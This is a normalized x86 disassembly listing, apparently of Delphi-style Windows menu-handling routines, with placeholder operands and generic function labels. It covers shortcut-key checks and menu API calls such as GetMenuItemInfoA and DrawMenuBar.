push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4498fc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44991c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44993c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44995c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44997c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44999c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413ec8
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_443ca4
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_443ddc
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_443e3c
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_443b3c
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_443efc
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449a14
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_4194fc
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_449128
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4495c4
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_449a68
jmp r-xdata
xor edx edx
mov eax esi
call sub_44752c
sub_449a68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_444f00
mov eax ebx
call sub_449ad8
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_444f44
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_4192b0
sub_449ab0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_449ab0
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_446c00
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_449544
mov eax ebx
pop esi
pop ebx
retn
sub_449aec
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40bf7c
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_4044cc
sub_449b1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404004
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_449ba0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40422c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40422c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_40448c
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404378
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449cc9
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404514
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_4042ec
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_40422c
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_40448c
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_4042ec
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_449d00
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404004
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_449140
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404004
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a1a6
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f90
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f90
lea eax [ ebp - 0x18 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax ebx
call sub_44a354
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_449150
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404378
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_449b1c
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_449150
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_449150
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
mov eax [ ebp - 0x20 ]
call sub_403234
mov eax [ ebp - 0x14 ]
call sub_403234
mov eax [ ebp - 0xc ]
call sub_403234
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_449b1c
pop ecx
mov eax [ ebp - 0x30 ]
call sub_40422c
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_449150
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_44bbf8
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407a2c
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403fc0
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40bf7c
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_449150
push eax
mov edx esi
mov eax ebx
call sub_449150
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_40448c
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407a2c
push ebp
mov eax [ ebp - 0x2c ]
call sub_449aec
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_449aec
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40bf7c
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404004
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_449150
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_449150
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_44bb64
mov edx [ ebp - 0x40 ]
pop eax
call sub_403fc0
mov edx esi
mov eax ebx
call sub_449150
push eax
mov edx esi
mov eax ebx
call sub_449150
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_40422c
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_40448c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_449ba0
mov eax [ ebp - 0x18 ]
call sub_40422c
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_4044cc
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404514
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_449ba0
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_44a1fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_449140
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_449140
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44a380
test al al
je r-xdata
mov eax esi
call sub_449140
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_449150
call sub_44a1d8
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_449150
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_449150
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_449150
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_449150
call sub_44a1d8
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_449150
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_449150
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_449150
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_449150
call sub_44a1d8
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_44a354
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44a354
and eax 0x7f
mov al [ eax + rw-data ]
sub_44a380
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44a380
and eax 0x7f
mov al [ eax + rw-data ]
sub_44a3ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447094
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_4191e0
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_44b0d8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44a448
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403234
mov eax [ esi + 0x44 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41922c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_44a4bc
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44a4bc
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_446c00
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_449544
mov eax ebx
pop esi
pop ebx
retn
sub_44a4fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_449140
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_449150
call sub_44a4fc
pop ecx
test al al
je r-xdata
sub_44a594
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_44a4fc
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_446c00
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44a5c4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_44a594
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_44b8e8
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_44a634
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_44a594
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_44a650
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_44a594
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_449d00
mov ebx eax
xor edx edx
mov eax edi
call sub_44a1fc
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_449668
mov eax [ esi + 0x34 ]
call sub_449668
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_4475a4
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_43db40
push eax
call DrawMenuBar
sub_44a73c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_44a73c
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_44a861
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_44a594
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_449668
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44a72c
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_44a890
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_421dac
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_421dac
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_44a73c
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_421da4
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a995
mov eax [ rw-data ]
call sub_421da4
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_44a594
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44a9b4
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_44ad38
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_44ad38
and eax 0x7f
